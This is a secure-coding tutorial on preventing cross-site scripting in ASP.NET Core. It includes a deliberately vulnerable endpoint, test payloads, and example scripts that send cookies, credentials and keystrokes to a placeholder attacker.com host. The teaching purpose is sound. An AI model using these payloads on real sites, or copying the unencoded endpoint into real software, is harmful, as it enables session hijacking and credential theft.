# STEP 4: XSS (Cross-Site Scripting) Prevention

## 🎯 Learning Objectives

By the end of this step, you will understand:
- What XSS (Cross-Site Scripting) attacks are and how they work
- The three types of XSS: Reflected, Stored, and DOM-based
- How XSS can steal cookies, session tokens, and sensitive data
- Why output encoding is critical for web security
- How to prevent XSS using HTML encoding in ASP.NET Core

---

## 🚨 What is XSS (Cross-Site Scripting)?

### Definition

**Cross-Site Scripting (XSS)** is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

**Key concept:** The application includes untrusted data (user input) in a web page without proper validation or encoding, allowing the attacker's script to execute in victims' browsers.

### How It Works

```
1. Attacker crafts malicious input containing JavaScript
2. Application accepts and renders the input without encoding
3. Victim's browser executes the malicious script
4. Script steals data or performs actions as the victim
```

**Example Attack Flow:**
```
Attacker → [<script>steal_cookies()</script>] → Website → Victim's Browser
                                                                ↓
                                                    Script executes in victim's context!
```

---

## 🎭 Types of XSS Attacks

### 1. Reflected XSS (Non-Persistent)

**What:** Malicious script is part of the request (URL, form input) and immediately reflected back in the response.

**Example:**
```
URL: https://example.com/profile?name=<script>alert('XSS')</script>
```

The page renders:
```html
<h1>Welcome, <script>alert('XSS')</script>!</h1>
```

**Impact:** Script executes immediately when victim clicks malicious link.

---

### 2. Stored XSS (Persistent)

**What:** Malicious script is stored in the database and executed whenever anyone views the affected page.

**Example:**
```
User posts comment: "<script>steal_session()</script>"
Database stores it
Every visitor sees the comment → script executes for everyone
```

**Impact:** More dangerous - affects all users, not just one victim.

---

### 3. DOM-Based XSS

**What:** Vulnerability exists in client-side JavaScript that processes user input unsafely.

**Example:**
```javascript
// Vulnerable JavaScript
document.getElementById('welcome').innerHTML = location.hash;
```

**URL:**
```
https://example.com#<img src=x onerror=alert('XSS')>
```

**Impact:** Entirely client-side - server may never see the attack.

---

## 💀 Real-World Attack Scenarios

### Scenario 1: Cookie Theft (Session Hijacking)

**Attacker's Payload:**
```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**What Happens:**
1. Script executes in victim's browser
2. Victim's session cookie is sent to attacker's server
3. Attacker uses stolen cookie to impersonate victim
4. Attacker gains full access to victim's account

**Real Impact:**
- Account takeover
- Access to private data
- Unauthorized transactions
- Identity theft

---

### Scenario 2: Credential Harvesting

**Attacker's Payload:**
```html
<script>
  document.body.innerHTML = '<form action="https://attacker.com/phish">' +
    'Session expired. Please login again:<br>' +
    'Email: <input name="email"><br>' +
    'Password: <input name="password" type="password"><br>' +
    '<button>Login</button></form>';
</script>
```

**What Happens:**
1. Page content replaced with fake login form
2. User enters credentials thinking it's legitimate
3. Credentials sent to attacker's server
4. Attacker has victim's username and password

---

### Scenario 3: Keylogger Injection

**Attacker's Payload:**
```html
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>
```

**What Happens:**
- Every keystroke sent to attacker
- Captures passwords, credit cards, private messages
- Completely invisible to victim

---

### Scenario 4: Malware Distribution

**Attacker's Payload:**
```html
<script>
  window.location = 'https://malware-site.com/ransomware.exe';
</script>
```

**What Happens:**
- Victim automatically redirected to malware download
- Browser may auto-download malicious file
- Device infected with ransomware/spyware

---

## 🔬 Demonstration Endpoints

### 1. Vulnerable Profile Page (Reflected XSS)

**Endpoint:** `GET /api/auth/profile-vulnerable?name={input}`

**Vulnerable Code:**
```csharp
[HttpGet("profile-vulnerable")]
public IActionResult ProfileVulnerable([FromQuery] string name)
{
    // ⚠️ DANGEROUS: Direct string interpolation without encoding
    var html = $@"
        <h1>Welcome, {name}!</h1>
    ";
    
    return Content(html, "text/html");
}
```

**Why It's Vulnerable:**
- User input `{name}` inserted directly into HTML
- No encoding or sanitization
- Browser interprets everything as HTML/JavaScript

**Attack Example:**
```bash
# Normal use
GET /api/auth/profile-vulnerable?name=John
Response: <h1>Welcome, John!</h1>

# Malicious use
GET /api/auth/profile-vulnerable?name=<script>alert('XSS')</script>
Response: <h1>Welcome, <script>alert('XSS')</script>!</h1>
                              ↑ Script executes!
```

**Test It:**
```bash
# Open in browser - you'll see an alert popup
http://localhost:5000/api/auth/profile-vulnerable?name=<script>alert('XSS')</script>
```

---

### 2. Secure Profile Page (XSS Protected)

**Endpoint:** `GET /api/auth/profile-secure?name={input}`

**Secure Code:**
```csharp
[HttpGet("profile-secure")]
public IActionResult ProfileSecure([FromQuery] string name)
{
    // ✅ SAFE: HTML encoding prevents script execution
    var encodedName = HttpUtility.HtmlEncode(name);
    
    var html = $@"
        <h1>Welcome, {encodedName}!</h1>
    ";
    
    return Content(html, "text/html");
}
```

**Why It's Safe:**
- `HttpUtility.HtmlEncode()` converts dangerous characters
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- Browser displays script as text, doesn't execute it

**Attack Prevention:**
```bash
# Malicious attempt
GET /api/auth/profile-secure?name=<script>alert('XSS')</script>

# What gets rendered
<h1>Welcome, &lt;script&gt;alert('XSS')&lt;/script&gt;!</h1>

# What user sees
Welcome, <script>alert('XSS')</script>!
         ↑ Displayed as text, not executed
```

**Test It:**
```bash
# Open in browser - script will be displayed as text, not executed
http://localhost:5000/api/auth/profile-secure?name=<script>alert('XSS')</script>
```

---

### 3. Interactive Demo Page

**Endpoint:** `GET /api/auth/xss-demo?payload={input}`

Shows side-by-side comparison of vulnerable vs secure rendering.

**Features:**
- Live demonstration of both approaches
- Pre-loaded attack payloads to test
- Visual explanation of HTML encoding
- Educational tooltips

**Test Payloads Included:**
1. `<script>alert("XSS")</script>` - Basic script injection
2. `<img src=x onerror=alert("XSS")>` - Image tag exploit
3. `<svg onload=alert("XSS")>` - SVG event handler
4. `<iframe src=javascript:alert("XSS")>` - IFrame JavaScript URL

**Access It:**
```bash
http://localhost:5000/api/auth/xss-demo
```

---

## 🛡️ How HTML Encoding Prevents XSS

### Character Conversion Table

| Character | HTML Entity | Purpose |
|-----------|-------------|---------|
| `<` | `&lt;` | Start of HTML tag |
| `>` | `&gt;` | End of HTML tag |
| `"` | `&quot;` | Attribute delimiter |
| `'` | `&#x27;` or `&apos;` | Attribute delimiter |
| `&` | `&amp;` | Entity start character |

### Before and After Encoding

**Original Input (Dangerous):**
```html
<script>alert('XSS')</script>
```

**After Encoding (Safe):**
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

**How Browser Interprets:**
```
Unencoded: Execute this as JavaScript! ❌
Encoded:   Display this as text. ✅
```

### Why It Works

1. **Encoding breaks HTML structure**
   - `<script>` → `&lt;script&gt;` is no longer a valid HTML tag
   - Browser sees literal text, not code
   
2. **Prevents tag injection**
   - Can't close existing tags
   - Can't create new tags
   - Can't inject event handlers

3. **Context-aware protection**
   - Different encoding for different contexts (HTML, JavaScript, URL, CSS)

---

## 🔐 Prevention Methods in ASP.NET Core

### Method 1: HttpUtility.HtmlEncode (Manual)

```csharp
using System.Web;

var userInput = "<script>alert('XSS')</script>";
var safe = HttpUtility.HtmlEncode(userInput);
// Result: &lt;script&gt;alert('XSS')&lt;/script&gt;
```

**Use When:**
- Building HTML strings manually
- Returning ContentResult with HTML
- Custom HTML generation

---

### Method 2: Razor Pages (Automatic)

Razor automatically HTML-encodes by default:

```razor
@model string UserName

<!-- Automatic encoding -->
<h1>Welcome, @UserName!</h1>

<!-- This is SAFE even if UserName contains scripts -->
```

**Input:** `<script>alert('XSS')</script>`  
**Output:** `&lt;script&gt;alert('XSS')&lt;/script&gt;`

**Explicit raw output (dangerous):**
```razor
<!-- DON'T DO THIS unless you control the content -->
<div>@Html.Raw(UserName)</div>
```

---

### Method 3: JSON Responses (Automatic)

ASP.NET Core automatically escapes special characters in JSON:

```csharp
return Ok(new { message = userInput });
```

**Input:** `<script>alert('XSS')</script>`  
**JSON Output:** `{"message":"<script>alert('XSS')</script>"}`

**Result:** Safe! JSON escaping prevents execution.

---

### Method 4: JavaScript Encoding (Context-Specific)

When embedding data in JavaScript:

```csharp
using System.Text.Encodings.Web;

var jsEncoder = JavaScriptEncoder.Default;
var safe = jsEncoder.Encode(userInput);
```

**Example:**
```javascript
// Dangerous
var name = '@UserInput';  // Can break out with: '; alert('XSS'); '

// Safe
var name = '@JavaScriptEncoder.Default.Encode(UserInput)';
```

---

### Method 5: URL Encoding (For URLs)

```csharp
using System.Web;

var searchQuery = "<script>alert('XSS')</script>";
var safe = HttpUtility.UrlEncode(searchQuery);
// Result: %3cscript%3ealert('XSS')%3c%2fscript%3e
```

**Use in URLs:**
```html
<a href="/search?q=@HttpUtility.UrlEncode(query)">Search</a>
```

---

## 📋 XSS Prevention Checklist

### ✅ DO

1. **Always encode output** based on context (HTML, JavaScript, URL, CSS)
2. **Use Razor Pages** - automatic encoding by default
3. **Validate input** - whitelist allowed characters when possible
4. **Set Content-Security-Policy** headers to restrict script sources
5. **Use HttpOnly cookies** - prevents JavaScript from reading cookies
6. **Implement CORS properly** - restrict which domains can make requests
7. **Sanitize HTML** if you must allow rich text (use libraries like HtmlSanitizer)

### ❌ DON'T

1. **Never trust user input** - assume all input is malicious
2. **Don't use `Html.Raw()`** unless content is trusted and sanitized
3. **Don't build HTML strings** with user input without encoding
4. **Don't disable encoding** in frameworks that auto-encode
5. **Don't rely only on client-side validation** - always validate server-side
6. **Don't store sensitive data in cookies** without HttpOnly/Secure flags
7. **Don't use `eval()` or `innerHTML`** with user-controlled data

---

## 🎓 Context-Specific Encoding

Different contexts require different encoding:

### HTML Context

```html
<div>User input here</div>
```
**Use:** `HttpUtility.HtmlEncode()`

### HTML Attribute Context

```html
<input value="user input here">
```
**Use:** `HttpUtility.HtmlAttributeEncode()`

### JavaScript Context

```javascript
var data = "user input here";
```
**Use:** `JavaScriptEncoder.Default.Encode()`

### URL Context

```html
<a href="/page?param=user input here">Link</a>
```
**Use:** `HttpUtility.UrlEncode()`

### CSS Context

```html
<div style="color: user input here">Text</div>
```
**Use:** CSS-specific sanitization (complex - avoid if possible)

---

## 🧪 Hands-On Testing

### Test 1: Basic Script Injection

**Vulnerable Endpoint:**
```bash
# Windows PowerShell
Start-Process "http://localhost:5000/api/auth/profile-vulnerable?name=<script>alert('XSS')</script>"
```

**Expected Result:** Alert popup appears (⚠️ Attack successful!)

**Secure Endpoint:**
```bash
Start-Process "http://localhost:5000/api/auth/profile-secure?name=<script>alert('XSS')</script>"
```

**Expected Result:** Script displayed as text (✅ Attack blocked!)

---

### Test 2: Image Tag Exploit

**Payload:**
```html
<img src=x onerror=alert('XSS')>
```

**Test:**
```bash
# Vulnerable
http://localhost:5000/api/auth/profile-vulnerable?name=<img src=x onerror=alert('XSS')>

# Secure
http://localhost:5000/api/auth/profile-secure?name=<img src=x onerror=alert('XSS')>
```

---

### Test 3: SVG onload Event

**Payload:**
```html
<svg onload=alert('XSS')>
```

**Why It Works:**
- SVG is a valid HTML element
- `onload` event fires when SVG loads
- Doesn't require invalid image source

---

### Test 4: Cookie Theft Simulation

**Payload:**
```html
<script>
  alert('Your cookies: ' + document.cookie);
</script>
```

**What It Demonstrates:**
- How scripts access sensitive browser data
- Why HttpOnly cookies are important
- Real attack impact

---

### Test 5: Interactive Demo

Visit the comprehensive demo page:
```bash
http://localhost:5000/api/auth/xss-demo
```

**Features:**
- Side-by-side vulnerable vs secure comparison
- Multiple attack payload examples
- Real-time encoding demonstration
- Educational explanations

---

## 🔒 Defense in Depth: Additional Protections

### 1. Content Security Policy (CSP)

HTTP header that restricts script sources:

```csharp
// Program.cs
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy", 
        "default-src 'self'; script-src 'self'; object-src 'none'");
    await next();
});
```

**What It Does:**
- Only allows scripts from same origin
- Blocks inline scripts
- Prevents external script loading

---

### 2. HttpOnly Cookies

Prevents JavaScript from accessing cookies:

```csharp
Response.Cookies.Append("sessionId", value, new CookieOptions
{
    HttpOnly = true,  // ✅ JavaScript can't read this
    Secure = true,    // ✅ Only sent over HTTPS
    SameSite = SameSiteMode.Strict  // ✅ CSRF protection
});
```

---

### 3. Input Validation

Validate before accepting:

```csharp
public class CommentRequest
{
    [Required]
    [MaxLength(1000)]
    [RegularExpression(@"^[a-zA-Z0-9\s.,!?-]+$", 
        ErrorMessage = "Only alphanumeric characters and basic punctuation allowed")]
    public string Content { get; set; }
}
```

---

### 4. Output Sanitization Libraries

For rich HTML content (forums, blogs):

```bash
dotnet add package HtmlSanitizer
```

```csharp
using Ganss.XSS;

var sanitizer = new HtmlSanitizer();
var safe = sanitizer.Sanitize(userHtml);
// Removes scripts but keeps safe HTML like <b>, <i>, <p>
```

---

## 📊 Impact Comparison

| Attack Vector | Without Encoding | With Encoding |
|---------------|------------------|---------------|
| **Script Injection** | ⚠️ Executes | ✅ Displayed as text |
| **Cookie Theft** | ⚠️ Stolen | ✅ HttpOnly blocks |
| **Session Hijacking** | ⚠️ Successful | ✅ Protected |
| **Phishing** | ⚠️ Fake forms work | ✅ Can't inject HTML |
| **Keylogging** | ⚠️ All keys captured | ✅ Can't inject listener |
| **Malware Distribution** | ⚠️ Auto-download | ✅ Blocked |

---

## 🎯 Real-World XSS Breaches

### 1. Twitter XSS Worm (2010)

**What Happened:**
- Stored XSS in tweet content
- Self-replicating: infected users automatically tweeted the malicious code
- 1 million+ users affected in 1 hour

**Cause:** Tweets not properly encoded when displayed

---

### 2. MySpace Samy Worm (2005)

**What Happened:**
- Stored XSS in profile page
- Script automatically added attacker as friend
- Over 1 million friend requests in 20 hours

**Cause:** Profile fields allowed unencoded HTML

---

### 3. eBay XSS (2017)

**What Happened:**
- Reflected XSS in listing descriptions
- Attackers redirected users to phishing sites
- Credit card theft

**Cause:** Product descriptions not properly sanitized

---

### 4. British Airways (2018)

**What Happened:**
- XSS injected payment form scripts
- 380,000 customers' credit card details stolen
- £183 million fine

**Cause:** Third-party script compromised (supply chain attack)

---

## 💡 Key Takeaways

### Core Principles

1. **Never trust user input** - Treat all input as malicious
2. **Always encode output** - Context-appropriate encoding is mandatory
3. **Defense in depth** - Multiple layers of protection
4. **Secure by default** - Use frameworks that auto-encode

### Encoding Rules

| Context | Method | Example |
|---------|--------|---------|
| HTML Body | `HtmlEncode()` | `<div>@encoded</div>` |
| HTML Attribute | `HtmlAttributeEncode()` | `<input value="@encoded">` |
| JavaScript | `JavaScriptEncoder` | `var x = '@encoded';` |
| URL | `UrlEncode()` | `href="/page?q=@encoded"` |
| JSON | Automatic | `{"name":"value"}` |

### Testing Strategy

1. **Manual testing** - Try common XSS payloads
2. **Automated scanning** - Use tools like OWASP ZAP
3. **Code review** - Check for encoding in all output
4. **Penetration testing** - Hire security professionals

---

## 🧪 PowerShell Test Script

Create and run `test-xss.ps1`:

```powershell
Write-Host "=== XSS Prevention Demo ===" -ForegroundColor Cyan

$baseUrl = "http://localhost:5000/api/auth"

# Test payloads
$payloads = @(
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
)

foreach ($payload in $payloads) {
    Write-Host "`nTesting payload: $payload" -ForegroundColor Yellow
    
    $encoded = [System.Web.HttpUtility]::UrlEncode($payload)
    
    Write-Host "Vulnerable endpoint..." -ForegroundColor Red
    Start-Process "$baseUrl/profile-vulnerable?name=$encoded"
    Start-Sleep -Seconds 2
    
    Write-Host "Secure endpoint..." -ForegroundColor Green
    Start-Process "$baseUrl/profile-secure?name=$encoded"
    Start-Sleep -Seconds 2
}

Write-Host "`n=== Opening interactive demo ===" -ForegroundColor Cyan
Start-Process "$baseUrl/xss-demo"
```

---

## 📚 Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [ASP.NET Core Security Documentation](https://docs.microsoft.com/aspnet/core/security/)
- [HtmlSanitizer Library](https://github.com/mganss/HtmlSanitizer)

---

## 🚀 Next Steps

**STEP 5: Rate Limiting & Brute-Force Protection**
- Implement request throttling
- Prevent credential stuffing
- Account lockout policies

---

**Remember:** XSS is consistently in OWASP Top 10. Always encode output, never trust input, and use security headers for defense in depth.
